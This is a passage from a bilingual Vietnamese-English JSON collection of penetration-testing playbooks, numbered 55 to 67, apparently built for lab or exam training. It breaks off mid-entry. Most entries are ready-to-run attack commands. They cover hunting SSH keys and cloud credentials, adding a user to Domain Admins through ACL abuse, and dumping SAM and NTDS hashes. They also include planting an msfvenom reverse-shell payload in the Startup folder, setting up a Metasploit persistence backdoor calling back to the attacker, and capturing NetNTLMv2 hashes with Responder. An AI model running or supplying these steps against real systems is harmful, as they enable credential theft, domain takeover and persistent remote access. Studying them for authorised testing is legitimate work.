    "content": "## Playbook 55: Pivoting - VPN \"Nghèo\" với sshuttle 🚶‍♂️🚇➡️🌍\n\n**Giả định:** Root shell trên Pivot Linux, có Python3, SSH access từ Kali.\n\n**Mục tiêu:** Tạo tunnel VPN bằng sshuttle.\n\n**Các bước thực hiện:**\n\n1.  **Cài sshuttle (Kali):** `sudo apt install sshuttle`.\n2.  **Xác định Subnet (Pivot):** `ip a`.\n3.  **Chạy sshuttle (Kali):** `sudo sshuttle --dns -r user@<Pivot_IP> <subnet1> <subnet2>`.\n4.  **Sử dụng Tunnel:** `ping`, `nmap` vào IP nội bộ.",
    "steps": [
      { "vi": "**Cài sshuttle (Kali):**", "en": "**Install sshuttle (Kali):**", "command": "sudo apt install sshuttle -y" },
      { "vi": "**Xác định Subnets (Pivot):**", "en": "**Identify Subnets (Pivot):**", "command": "ip a" },
      { "vi": "**Chạy sshuttle (Kali):**", "en": "**Run sshuttle (Kali):**", "command": "sudo sshuttle --dns -r <user>@<Box_A_IP> <subnet1> <subnet2>" },
      { "vi": "**Kiểm tra Kết nối:**", "en": "**Test Connection:**", "command": "ping <Internal_Target_IP>" }
    ],
    "related_knowledge_ids": ["ssh_tunnel_sshuttle", "sshuttle", "ssh", "ip", "ping", "nmap", "curl"]
  },
  "playbook_56_ad_enum_bloodhound_paths": {
    "title": {
      "vi": "Playbook 56: AD Enumeration - Phân tích Đường tấn công BloodHound",
      "en": "Playbook 56: AD Enumeration - Analyzing BloodHound Attack Paths"
    },
    "assumption": "Đã import dữ liệu SharpHound vào BloodHound GUI.",
    "objective": "Sử dụng BloodHound để tìm đường tấn công leo thang đặc quyền (ví dụ: lên Domain Admins).",
    "tools": ["bloodhound", "sharphound"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration", "Attack Path Analysis", "Graph Theory"],
    "targets": ["Active Directory Domain", "Domain Admins"],
    "os": ["Any (BloodHound GUI)"],
    "tags": ["ad", "active directory", "bloodhound", "sharphound", "enumeration", "attack path", "visualization", "domain admin"],
    "content": "## Playbook 56: AD Enum - Phân tích Đường tấn công BloodHound 🗺️➡️👑\n\n**Giả định:** Đã import dữ liệu SharpHound.\n\n**Mục tiêu:** Tìm đường tấn công lên Domain Admins.\n\n**Các bước thực hiện:**\n\n1.  **Chạy BloodHound:** `neo4j`, `bloodhound`.\n2.  **Phân tích Node:** Tìm node nguồn, node đích (Domain Admins).\n3.  **Tìm Đường Tấn Công:** Click biểu tượng Attack Paths.\n4.  **Phân tích:** Xem xét các quan hệ (MemberOf, AdminTo, HasSession, ACLs).\n5.  **Sử dụng Queries:** Chạy truy vấn tích hợp (`Find Shortest Paths...`, `Find Kerberoastable Users`...).",
    "steps": [
      { "vi": "**Chạy BloodHound:**", "en": "**Run BloodHound:**", "command": "sudo neo4j start; bloodhound" },
      { "vi": "**Chọn Node Nguồn & Đích:**", "en": "**Select Source & Target Nodes:**", "command": "# Find your user/computer node, Find 'Domain Admins', Mark as Target" },
      { "vi": "**Tìm Đường Tấn Công:**", "en": "**Find Attack Paths:**", "command": "# Click Attack Paths icon" },
      { "vi": "**Phân tích Quan hệ:**", "en": "**Analyze Relationships:**", "command": "# Examine MemberOf, AdminTo, HasSession, GenericAll etc." },
      { "vi": "**Chạy Truy vấn Tích hợp:**", "en": "**Run Built-in Queries:**", "command": "# Go to Queries tab, run relevant queries" }
    ],
    "related_knowledge_ids": ["ad_pentest_enum_bloodhound", "bloodhound", "sharphound", "neo4j", "domain_admins", "kerberoasting", "acl"]
  },
  "playbook_57_ad_enum_powerview_focus": {
    "title": {
      "vi": "Playbook 57: AD Enumeration - PowerView Focus",
      "en": "Playbook 57: AD Enumeration - PowerView Focus"
    },
    "assumption": "Có shell PowerShell trên máy join domain, có `PowerView.ps1`.",
    "objective": "Sử dụng PowerView để thu thập thông tin AD chi tiết.",
    "tools": ["powershell", "powerview"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["Active Directory Enumeration"],
    "targets": ["Active Directory Domain"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "enumeration", "powerview", "powershell", "get-netuser", "get-netgroup", "get-netcomputer", "get-objectacl", "get-netgpo"],
    "content": "## Playbook 57: AD Enum - PowerView Focus 🕵️‍♂️🔎\n\n**Giả định:** Có shell PowerShell, có `PowerView.ps1`.\n\n**Mục tiêu:** Thu thập thông tin AD chi tiết bằng PowerView.\n\n**Các bước thực hiện:**\n\n1.  **Import Module:** `Import-Module .\\PowerView.ps1`.\n2.  **Domain/Forest Info:** `Get-NetDomain`, `Get-NetDomainController`, `Get-DomainPolicy`.\n3.  **Users:** `Get-NetUser`, `Get-NetUser -SPN`, `Get-DomainUser -PreauthNotRequired`.\n4.  **Groups:** `Get-NetGroup`, `Get-NetGroupMember \"Domain Admins\"`.\n5.  **Computers:** `Get-NetComputer`.\n6.  **Access Rights:** `Find-LocalAdminAccess`, `Get-NetSession`, `Get-ObjectAcl`, `Find-InterestingDomainAcl`.\n7.  **GPOs:** `Get-NetGPO`.\n8.  **Trusts:** `Get-NetDomainTrust`.",
    "steps": [
      { "vi": "**Import Module:**", "en": "**Import Module:**", "command": "Import-Module .\\PowerView.ps1" },
      { "vi": "**Lấy Thông tin Domain:**", "en": "**Get Domain Info:**", "command": "Get-NetDomain" },
      { "vi": "**Liệt kê Users:**", "en": "**List Users:**", "command": "Get-NetUser | select cn,description,pwdlastset" },
      { "vi": "**Tìm User Kerberoastable:**", "en": "**Find Kerberoastable Users:**", "command": "Get-NetUser -SPN" },
      { "vi": "**Xem Thành viên Domain Admins:**", "en": "**View Domain Admins Members:**", "command": "Get-NetGroupMember -GroupName \"Domain Admins\"" },
      { "vi": "**Tìm Quyền Admin Local:**", "en": "**Find Local Admin Access:**", "command": "Find-LocalAdminAccess" },
      { "vi": "**Kiểm tra ACL của User:**", "en": "**Check User ACL:**", "command": "Get-ObjectAcl -Identity <username> -ResolveGUIDs" }
    ],
    "related_knowledge_ids": ["ad_pentest_enum_powerview", "powershell", "powerview", "Get-NetDomain", "Get-NetUser", "Get-NetGroup", "Get-NetComputer", "ad_enum_spn", "ad_pentest_enum_powerview", "ad_enum_powerview_loggedon", "ad_enum_object_permissions_acl", "Get-NetGPO"]
  },
  "playbook_58_postex_linux_find_keys": {
    "title": {
      "vi": "Playbook 58: Linux Post-Exploitation - Tìm và Sử dụng SSH Keys",
      "en": "Playbook 58: Linux Post-Exploitation - Finding and Using SSH Keys"
    },
    "assumption": "Đã có shell (user hoặc root) trên Linux.",
    "objective": "Tìm SSH private keys và sử dụng chúng để di chuyển ngang.",
    "tools": ["find", "cat", "ssh", "ssh2john", "john"],
    "phases": ["Post Exploitation", "Lateral Movement", "Credential Access"],
    "techniques": ["Credential Hunting", "SSH Key Discovery", "Lateral Movement"],
    "targets": ["SSH Private Keys", "Other Linux Machines"],
    "os": ["Linux"],
    "tags": ["linux", "post exploitation", "credential hunting", "ssh key", "id_rsa", "find", "lateral movement", "ssh", "ssh2john", "john"],
    "content": "## Playbook 58: Linux Post-Ex - Tìm và Sử dụng SSH Keys 🕵️‍♂️🔑➡️🚶‍♂️\n\n**Giả định:** Có shell trên Linux.\n\n**Mục tiêu:** Tìm SSH private keys và dùng để di chuyển ngang.\n\n**Các bước thực hiện:**\n\n1.  **Tìm Keys:** `find /home /root -name 'id_rsa*' 2>/dev/null`.\n2.  **Lấy Key:** `cat /path/to/id_rsa`, copy về Kali, `chmod 600`.\n3.  **Crack Passphrase:** Nếu key mã hóa, `ssh2john key > hash`, `john --wordlist=wl hash`.\n4.  **Xác định Mục tiêu:** Tìm gợi ý trong `known_hosts`, history.\n5.  **Thử Đăng nhập:** `ssh -i key user@<target_ip>`.",
    "steps": [
      { "vi": "**Tìm Keys:**", "en": "**Find Keys:**", "command": "find /home /root -name 'id_rsa*' 2>/dev/null" },
      { "vi": "**Copy Key về Kali & Chmod:**", "en": "**Copy Key to Kali & Chmod:**", "command": "cat /path/to/id_rsa # (Copy content); chmod 600 keyfile_on_kali" },
      { "vi": "**Crack Passphrase (Nếu cần):**", "en": "**Crack Passphrase (If needed):**", "command": "ssh2john keyfile_on_kali > key.hash; john --wordlist=wl.txt key.hash" },
      { "vi": "**Thử Đăng nhập:**", "en": "**Attempt Login:**", "command": "ssh -i keyfile_on_kali <user>@<target_ip>" }
    ],
    "related_knowledge_ids": ["linuxprivesc_manual_password_loot", "linux_important_locations_users_auth", "find", "cat", "ssh", "ssh_enumeration_attack", "chmod", "ssh2john", "john", "password_cracking_ssh_key_passphrase"]
  },
  "playbook_59_postex_windows_find_keys": {
    "title": {
      "vi": "Playbook 59: Windows Post-Exploitation - Tìm Keys và Configs",
      "en": "Playbook 59: Windows Post-Exploitation - Finding Keys and Configs"
    },
    "assumption": "Đã có shell (user hoặc Admin/SYSTEM) trên Windows.",
    "objective": "Tìm kiếm keys (SSH, API), file cấu hình, thông tin nhạy cảm.",
    "tools": ["dir", "findstr", "Get-ChildItem", "type", "reg query"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["File Searching", "Registry Searching", "Credential Hunting"],
    "targets": ["Configuration Files", "SSH Keys", "API Keys", "User Directories", "Registry"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "credential hunting", "findstr", "get-childitem", "sensitive files", "ssh keys", "api keys", "config files", "registry"],
    "content": "## Playbook 59: Windows Post-Ex - Tìm Keys và Configs 🕵️‍♀️🔑📄\n\n**Giả định:** Có shell trên Windows.\n\n**Mục tiêu:** Tìm keys, configs nhạy cảm.\n\n**Các bước thực hiện:**\n\n1.  **Tìm SSH Keys:** `dir C:\\Users\\*\\.ssh\\* /s /b`.\n2.  **Tìm AWS Creds:** `dir C:\\Users\\*\\.aws\\credentials /s /b`.\n3.  **Tìm File Config:** `dir C:\\*.config /s /b`, `Get-ChildItem ... | Select-String 'key','secret'`.\n4.  **Tìm theo Từ khóa:** `findstr /spin \"apikey\" C:\\*.* /L`.\n5.  **Tìm trong Registry:** `reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s`.",
    "steps": [
      { "vi": "**Tìm SSH Keys:**", "en": "**Find SSH Keys:**", "command": "dir C:\\Users\\*\\.ssh\\id_rsa* /s /b" },
      { "vi": "**Tìm AWS Creds:**", "en": "**Find AWS Creds:**", "command": "dir C:\\Users\\*\\.aws\\credentials /s /b" },
      { "vi": "**Tìm File Config:**", "en": "**Find Config Files:**", "command": "dir C:\\*.config C:\\inetpub\\wwwroot\\web.config /s /b" },
      { "vi": "**Tìm Nội dung File (PS):**", "en": "**Find File Content (PS):**", "command": "Get-ChildItem -Path C:\\ -Include *.config,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password','key'" },
      { "vi": "**Tìm Putty Sessions (Registry):**", "en": "**Find Putty Sessions (Registry):**", "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s" }
    ],
    "related_knowledge_ids": ["dir", "findstr", "Get-ChildItem", "type", "reg query", "linux_important_locations_users_auth", "playbook_26_windows_postex_find_sensitive", "winprivesc_password_hunting_files", "winprivesc_password_hunting_registry"]
  },
  "playbook_60_ad_acl_abuse": {
    "title": {
      "vi": "Playbook 60: AD Attack - Lạm dụng ACL Nguy hiểm",
      "en": "Playbook 60: AD Attack - Dangerous ACL Abuse"
    },
    "assumption": "Có shell user join domain. Enum (BloodHound, PowerView) phát hiện quyền ghi nguy hiểm (GenericAll, GenericWrite, WriteDacl, ...) trên user/group đặc quyền.",
    "objective": "Lạm dụng quyền ACL để leo thang đặc quyền AD.",
    "tools": ["powerview", "powershell (Active Directory Module)", "net user", "net group"],
    "phases": ["Privilege Escalation", "Lateral Movement"],
    "techniques": ["ACL Abuse", "Active Directory Privilege Escalation"],
    "targets": ["Active Directory Objects (Users, Groups)", "ACLs"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "privesc", "acl", "acl abuse", "genericall", "genericwrite", "writedacl", "self-membership", "powerview", "bloodhound"],
    "content": "## Playbook 60: AD Attack - Lạm dụng ACL Nguy hiểm 🏰🔓➡️👑\n\n**Giả định:** User có quyền ghi nguy hiểm trên user/group đặc quyền.\n\n**Mục tiêu:** Lạm dụng ACL để leo thang đặc quyền AD.\n\n**Các bước thực hiện (Tùy quyền):**\n\n1.  **Xác định Quyền:** `Get-ObjectAcl -Identity <Target>`.\n2.  **Lạm dụng:**\n    * `GenericAll/WriteDacl` (Group): `Add-DomainGroupMember -Identity \"DA\" -Members <User>`.\n    * `GenericAll/Write/...` (User): `Set-DomainUserPassword -Identity <Target> -Password '<New>'`.\n    * `Self-Membership` (Group): `Add-DomainGroupMember -Identity \"Group\" -Members <Self>`.\n    * `WriteProperty (SPN)`: `Set-DomainObject -Identity <Target> -Set @{spn='Fake/Any'}` -> Kerberoast.",
    "steps": [
      { "vi": "**Kiểm tra ACL (PowerView):**", "en": "**Check ACL (PowerView):**", "command": "Get-ObjectAcl -Identity <TargetObject> -ResolveGUIDs" },
      { "vi": "**Thêm User vào Group (GenericAll/WriteDacl/Self):**", "en": "**Add User to Group (GenericAll/WriteDacl/Self):**", "command": "Add-DomainGroupMember -Identity \"Domain Admins\" -Members <CurrentUser>" },
      { "vi": "**Reset Password User (GenericWrite/Force):**", "en": "**Reset User Password (GenericWrite/Force):**", "command": "Set-DomainUserPassword -Identity <TargetUser> -Password '<NewPassword>'" },
      { "vi": "**Set SPN (WriteProperty):** -> Kerberoast", "en": "**Set SPN (WriteProperty):** -> Kerberoast", "command": "Set-DomainObject -Identity <TargetUser> -Set @{serviceprincipalname='FakeService/Anything'}" }
    ],
    "related_knowledge_ids": ["ad_enum_object_permissions_acl", "acl", "powerview", "Get-ObjectAcl", "Add-DomainGroupMember", "Set-DomainUserPassword", "net user", "net group", "ad_attack_kerberoasting", "Set-DomainObject"]
  },
 // Playbooks 61-90
  "playbook_61_windows_privesc_sebackupprivilege": {
    "title": {
      "vi": "Playbook 61: Windows PrivEsc qua SeBackupPrivilege",
      "en": "Playbook 61: Windows PrivEsc via SeBackupPrivilege"
    },
    "assumption": "Có shell user Windows. `whoami /priv` cho thấy user có `SeBackupPrivilege` được bật (thường là thành viên nhóm Backup Operators).",
    "objective": "Lạm dụng SeBackupPrivilege để sao chép file SAM và SYSTEM hives (hoặc NTDS.dit nếu là DC) nhằm dump hash offline.",
    "tools": ["whoami", "reg", "copy", "impacket-secretsdump"],
    "phases": ["Privilege Escalation", "Credential Access"],
    "techniques": ["Privilege Abuse", "SeBackupPrivilege", "Offline Hash Dumping"],
    "targets": ["SAM Hive", "SYSTEM Hive", "NTDS.dit"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "sebackupprivilege", "privilege abuse", "backup operators", "sam dump", "system hive", "ntds.dit", "offline hash dump", "impacket-secretsdump"],
    "content": "## Playbook 61: Windows PrivEsc qua SeBackupPrivilege 💻⬆️💾➡️🔑\n\n**Giả định:** User có `SeBackupPrivilege`.\n\n**Mục tiêu:** Sao chép SAM/SYSTEM/NTDS.dit và dump hash offline.\n\n**Các bước thực hiện:**\n\n1.  **Xác nhận Privilege:** `whoami /priv`.\n2.  **Sao chép Hives (Sử dụng `reg save` hoặc `copy /B`):**\n    ```powershell\n    reg save hklm\\sam C:\\Windows\\Temp\\sam.hive /y \n    reg save hklm\\system C:\\Windows\\Temp\\system.hive /y \n    # copy C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit /B /Y # (Nếu là DC)\n    ```\n3.  **Tải Hives về Kali:** Sử dụng HTTP upload server hoặc SMB server.\n4.  **Dump Hashes Offline:**\n    ```bash\n    impacket-secretsdump -sam sam.hive -system system.hive LOCAL \n    # impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL # (Nếu là DC)\n    ```\n5.  **Sử dụng Hash:** Dùng hash Admin/SYSTEM/krbtgt cho PtH hoặc Golden Ticket.",
    "steps": [
      {"vi": "**Xác nhận Privilege:**", "en": "**Confirm Privilege:**", "command": "whoami /priv"},
      {"vi": "**Sao chép SAM:**", "en": "**Copy SAM:**", "command": "reg save hklm\\sam C:\\Windows\\Temp\\sam.hive /y"},
      {"vi": "**Sao chép SYSTEM:**", "en": "**Copy SYSTEM:**", "command": "reg save hklm\\system C:\\Windows\\Temp\\system.hive /y"},
      {"vi": "**Sao chép NTDS.dit (Nếu là DC):**", "en": "**Copy NTDS.dit (If DC):**", "command": "copy C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit /B /Y"},
      {"vi": "**Tải Hives về Kali:**", "en": "**Download Hives to Kali:**", "command": "# Use HTTP Upload Server or SMB Server"},
      {"vi": "**Dump Hashes (SAM/SYSTEM - Kali):**", "en": "**Dump Hashes (SAM/SYSTEM - Kali):**", "command": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL"},
      {"vi": "**Dump Hashes (NTDS.dit - Kali):**", "en": "**Dump Hashes (NTDS.dit - Kali):**", "command": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL"},
      {"vi": "**Sử dụng Hash:**", "en": "**Use Hashes:**", "command": "# Use for PtH (Playbook 25) or Golden Ticket (Playbook 27)"}
    ],
    "related_knowledge_ids": ["winprivesc_exploits_theory", "whoami /priv", "reg save", "copy", "winprivesc_other_vectors", "ad_attack_shadow_copies", "file_transfer_http_download", "file_transfer_smb_download", "impacket-secretsdump", "winprivesc_sam_system_dump"]
  },
  "playbook_62_windows_privesc_startup_autorun": {
    "title": {
      "vi": "Playbook 62: Windows PrivEsc qua Writable Startup/Autorun",
      "en": "Playbook 62: Windows PrivEsc via Writable Startup/Autorun"
    },
    "assumption": "Có shell user Windows. Phát hiện thư mục Startup (`C:\\ProgramData\\...\\StartUp`) hoặc một registry key Autorun (`HKLM\\...\\Run`) trỏ đến vị trí có quyền ghi.",
    "objective": "Leo thang quyền bằng cách đặt payload vào vị trí Startup/Autorun để thực thi khi admin đăng nhập.",
    "tools": ["icacls", "accesschk.exe", "reg query", "msfvenom", "nc"],
    "phases": ["Privilege Escalation", "Persistence"],
    "techniques": ["Startup Folder Abuse", "Autorun Abuse", "Insecure File Permissions", "Persistence"],
    "targets": ["Windows Startup Folder", "Registry Autorun Keys"],
    "os": ["Windows"],
    "tags": ["windows", "privesc", "persistence", "startup folder", "autorun", "registry", "insecure permissions", "msfvenom"],
    "content": "## Playbook 62: Windows PrivEsc qua Writable Startup/Autorun 💻⬆️🚀\n\n**Giả định:** Thư mục Startup hoặc vị trí Autorun có quyền ghi.\n\n**Mục tiêu:** Leo thang khi admin đăng nhập.\n\n**Các bước thực hiện:**\n\n1.  **Xác định Vị trí & Quyền ghi:**\n    * Startup: `icacls \"C:\\ProgramData\\...\\StartUp\"`.\n    * Autorun: `reg query HKLM\\...\\Run`, `icacls \"C:\\Path\\App.exe\"`.\n2.  **Tạo Payload:** `msfvenom ... -o startup.exe`.\n3.  **Đặt Payload:** Copy vào Startup folder hoặc thay thế file Autorun.\n4.  **Mở Listener:** `rlwrap nc -lvnp 4447`.\n5.  **Chờ Đăng nhập:** Đợi admin đăng nhập.",
    "steps": [
      {"vi": "**Kiểm tra Quyền ghi Startup Folder:**", "en": "**Check Startup Folder Write Permissions:**", "command": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""},
      {"vi": "**Kiểm tra Quyền ghi File Autorun:**", "en": "**Check Autorun File Write Permissions:**", "command": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run; icacls \"C:\\Path\\To\\Autorun\\App.exe\""},
      {"vi": "**Tạo Payload:**", "en": "**Create Payload:**", "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4447 -f exe -o startup.exe"},
      {"vi": "**Đặt Payload vào Startup:**", "en": "**Place Payload in Startup:**", "command": "copy startup.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\""},
      {"vi": "**Hoặc Thay thế File Autorun:**", "en": "**Or Replace Autorun File:**", "command": "copy C:\\Path\\To\\Autorun\\App.exe C:\\Windows\\Temp\\App.bak; copy C:\\Windows\\Temp\\startup.exe C:\\Path\\To\\Autorun\\App.exe /Y"},
      {"vi": "**Mở Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4447"},
      {"vi": "**Chờ Admin Đăng nhập:**", "en": "**Wait for Admin Login:**"}
    ],
    "related_knowledge_ids": ["winprivesc_startup_apps", "winprivesc_autorun", "icacls", "reg query", "accesschk.exe", "winprivesc_weak_registry_permissions", "msfvenom", "rce_kali_setup", "persistence"]
  },
  "playbook_63_metasploit_post_hashdump": {
    "title": {
      "vi": "Playbook 63: Metasploit Post-Ex - Dump Hashes (hashdump)",
      "en": "Playbook 63: Metasploit Post-Ex - Dump Hashes (hashdump)"
    },
    "assumption": "Đã có session Meterpreter với quyền SYSTEM trên Windows.",
    "objective": "Sử dụng module `post/windows/gather/hashdump` hoặc lệnh `hashdump` để trích xuất NTLM hashes từ SAM.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Dumping", "SAM Dumping"],
    "targets": ["SAM Database"],
    "os": ["Windows"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "credential dumping", "hashdump", "sam dump", "ntlm hash"],
    "content": "## Playbook 63: Metasploit Post-Ex - Dump Hashes 🕵️‍♀️🔑 (MSF)\n\n**Giả định:** Có Meterpreter session SYSTEM.\n\n**Mục tiêu:** Dump NTLM hashes từ SAM.\n\n**Các bước thực hiện:**\n\n1.  **Kiểm tra Quyền:** `getuid`, `getsystem` (nếu cần).\n2.  **Dump Hashes (Lệnh):** `hashdump`.\n3.  **Dump Hashes (Module Post):** `use post/windows/gather/hashdump`, `set SESSION <id>`, `run`.\n4.  **Lưu Hashes & Sử dụng:** Dùng cho PtH hoặc crack.",
    "steps": [
      {"vi": "**Kiểm tra Quyền (Meterpreter):**", "en": "**Check Privileges (Meterpreter):**", "command": "getuid"},
      {"vi": "**Thử Lấy SYSTEM (Meterpreter):**", "en": "**Attempt Getsystem (Meterpreter):**", "command": "getsystem"},
      {"vi": "**Dump Hashes (Lệnh Meterpreter):**", "en": "**Dump Hashes (Meterpreter Command):**", "command": "hashdump"},
      {"vi": "**Dump Hashes (Module Post):**", "en": "**Dump Hashes (Post Module):**", "command": "use post/windows/gather/hashdump; set SESSION <id>; run"},
      {"vi": "**Sử dụng Hashes:**", "en": "**Use Hashes:**", "command": "# Use for PtH (Playbook 25) or offline cracking"}
    ],
    "related_knowledge_ids": ["metasploit", "meterpreter", "post_exploitation", "credential_dumping", "hashdump", "sam_dump", "ntlm_hash", "getsystem", "metasploit_post_exploitation_lab_getsystem_migrate", "metasploit_post_exploitation_modules"]
  },
  "playbook_64_metasploit_post_persistence": {
    "title": {
      "vi": "Playbook 64: Metasploit Post-Ex - Persistence Module",
      "en": "Playbook 64: Metasploit Post-Ex - Persistence Module"
    },
    "assumption": "Đã có session Meterpreter (Admin/SYSTEM) trên Windows.",
    "objective": "Sử dụng module persistence của Metasploit để thiết lập backdoor.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Post Exploitation", "Persistence"],
    "techniques": ["Persistence"],
    "targets": ["Windows System"],
    "os": ["Windows"],
    "tags": ["metasploit", "meterpreter", "post exploitation", "persistence", "backdoor"],
    "content": "## Playbook 64: Metasploit Post-Ex - Persistence 📌🤖 (MSF)\n\n**Giả định:** Có Meterpreter session Admin/SYSTEM.\n\n**Mục tiêu:** Thiết lập persistence bằng module MSF.\n\n**Các bước thực hiện:**\n\n1.  **Chạy Module Persistence (Meterpreter):** `run persistence -X -i 60 -p <LPORT> -r <LHOST>`.\n2.  **Thiết lập Handler (MSF Console):** `use multi/handler`, `set PAYLOAD ...`, `set LHOST/LPORT`, `run -j`.\n3.  **Kiểm tra:** Chờ kết nối lại.",
    "steps": [
      {"vi": "**Chạy Persistence (Meterpreter):**", "en": "**Run Persistence (Meterpreter):**", "command": "run persistence -X -i 60 -p 4433 -r <kali_ip>" },
      {"vi": "**Thiết lập Handler (MSF Console):**", "en": "**Setup Handler (MSF Console):**", "command": "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <kali_ip>; set LPORT 4433; run -j" },
      {"vi": "**Chờ Kết nối lại:**", "en": "**Wait for Reconnect:**", "command": "# Wait for new session"}
    ],
    "related_knowledge_ids": ["metasploit", "meterpreter", "post_exploitation", "persistence", "multi_handler", "metasploit_msfvenom_handler"]
  },
  "playbook_65_metasploit_rc_script": {
    "title": {
      "vi": "Playbook 65: Metasploit Automation - Resource Script (.rc)",
      "en": "Playbook 65: Metasploit Automation - Resource Script (.rc)"
    },
    "assumption": "Biết trước exploit module, payload và các tham số cần thiết.",
    "objective": "Tự động hóa việc chạy exploit/handler bằng resource script.",
    "tools": ["metasploit", "text editor"],
    "phases": ["Exploitation", "Automation"],
    "techniques": ["Automation", "Resource Script"],
    "targets": ["Metasploit Workflow"],
    "os": ["Any (Kali)"],
    "tags": ["metasploit", "automation", "resource script", "rc script"],
    "content": "## Playbook 65: Metasploit Automation - Resource Script 🤖📄\n\n**Giả định:** Biết exploit module và tham số.\n\n**Mục tiêu:** Tự động hóa exploit bằng file `.rc`.\n\n**Các bước thực hiện:**\n\n1.  **Tạo File `.rc`:** Chứa các lệnh `msfconsole` (use, set, exploit -j -z).\n2.  **Chạy MSF:** `msfconsole -r <script_name>.rc`.\n3.  **Quản lý Sessions:** `sessions -l`, `sessions -i <id>`.",
    "steps": [
      {"vi": "**Tạo File RC:**", "en": "**Create RC File:**", "command": "nano exploit.rc # (Add msfconsole commands like: use ..., set ..., exploit -j -z)"},
      {"vi": "**Chạy MSF với RC:**", "en": "**Run MSF with RC:**", "command": "msfconsole -r exploit.rc"},
      {"vi": "**Kiểm tra Sessions:**", "en": "**Check Sessions:**", "command": "sessions -l"}
    ],
    "related_knowledge_ids": ["metasploit_automation_resource_scripts", "metasploit", "msfconsole", "exploit", "multi_handler", "sessions"]
  },
  "playbook_66_hashcat_custom_rule": {
    "title": {
      "vi": "Playbook 66: Password Cracking - Tạo Hashcat Rule Tùy chỉnh",
      "en": "Playbook 66: Password Cracking - Creating Custom Hashcat Rule"
    },
    "assumption": "Nghi ngờ mật khẩu theo một mẫu cụ thể.",
    "objective": "Tạo file rule Hashcat để biến đổi wordlist theo mẫu.",
    "tools": ["hashcat", "text editor"],
    "phases": ["Credential Access"],
    "techniques": ["Password Cracking", "Wordlist Mutation", "Hashcat Rules"],
    "targets": ["Password Hashes"],
    "os": ["Any (Kali)"],
    "tags": ["password cracking", "hashcat", "rules", "wordlist mutation", "password policy"],
    "content": "## Playbook 66: Password Cracking - Hashcat Rule Tùy chỉnh 🔨🔑\n\n**Giả định:** Mật khẩu theo mẫu: `Word2025!`.\n\n**Mục tiêu:** Tạo rule Hashcat cho mẫu này.\n\n**Các bước thực hiện:**\n\n1.  **Phân tích Mẫu:** `Word` -> `c` (Capitalize) -> `$2 $0 $2 $5` (Append 2025) -> `$!` (Append !).\n2.  **Tạo File Rule:** `myrule.rule` chứa `c $2 $0 $2 $5 $!`.\n3.  **Chạy Hashcat:** `hashcat -m <mode> ... -r myrule.rule`.\n4.  **Kiểm tra:** `hashcat ... --show`.",
    "steps": [
      {"vi": "**Phân tích Mẫu Mật khẩu:**", "en": "**Analyze Password Pattern:**", "command": "# Example: Word -> Capitalize -> Append Year -> Append !" },
      {"vi": "**Tạo File Rule:**", "en": "**Create Rule File:**", "command": "echo 'c $2 $0 $2 $5 $!' > myrule.rule" },
      {"vi": "**Chạy Hashcat với Rule:**", "en": "**Run Hashcat with Rule:**", "command": "hashcat -m <hash_mode> hashes.txt wordlist.txt -r myrule.rule --force" },
      {"vi": "**Xem Kết quả:**", "en": "**Show Results:**", "command": "hashcat -m <hash_mode> hashes.txt --show" }
    ],
    "related_knowledge_ids": ["password_cracking_mutating_wordlists", "hashcat", "rules"]
  },
  "playbook_67_capture_crack_netntlmv2": {
    "title": {
      "vi": "Playbook 67: Capture & Crack NetNTLMv2 Hash",
      "en": "Playbook 67: Capture & Crack NetNTLMv2 Hash"
    },
    "assumption": "Có thể kích hoạt xác thực SMB/HTTP từ target đến Kali.",
    "objective": "Bắt NetNTLMv2 hash bằng Responder/Impacket, crack bằng Hashcat.",
    "tools": ["responder", "impacket-smbserver", "hashcat", "nc (để test)"],
    "phases": ["Credential Access"],
    "techniques": ["NTLM Relay (Capture Phase)", "Offline Hash Cracking"],
    "targets": ["Windows Authentication", "NetNTLMv2 Hash"],
    "os": ["Windows (Target)", "Linux (Kali)"],
    "tags": ["credential hunting", "netntlmv2", "responder", "impacket-smbserver", "hashcat", "mode_5600", "offline hash cracking"],
    "content": "## Playbook 67: Capture & Crack NetNTLMv2 🎣🔑➡️🔓\n\n**Giả định:** Có thể kích hoạt xác thực NTLM từ target đến Kali.\n\n**Mục tiêu:** Bắt và crack NetNTLMv2 hash.\n\n**Các bước thực hiện:**\n\n1.  **Chạy Listener (Kali):** `sudo responder -I <iface>` hoặc `sudo impacket-smbserver SHARE /tmp`.\n2.  **Kích hoạt Xác thực (Target):** `dir \\\\<KALI_IP>\\fakepath`.\n3.  **Lấy Hash:** Copy hash từ output của listener.\n4.  **Crack Hash (Kali):** `hashcat -m 5600 hash.txt wordlist.txt`.",
    "steps": [
      {"vi": "**Chạy Responder (Kali):**", "en": "**Run Responder (Kali):**", "command": "sudo responder -I eth0 -v"},
      {"vi": "**Hoặc Chạy Impacket SMB (Kali):**", "en": "**Or Run Impacket SMB (Kali):**", "command": "sudo impacket-smbserver -smb2support SHARE /tmp/share"},
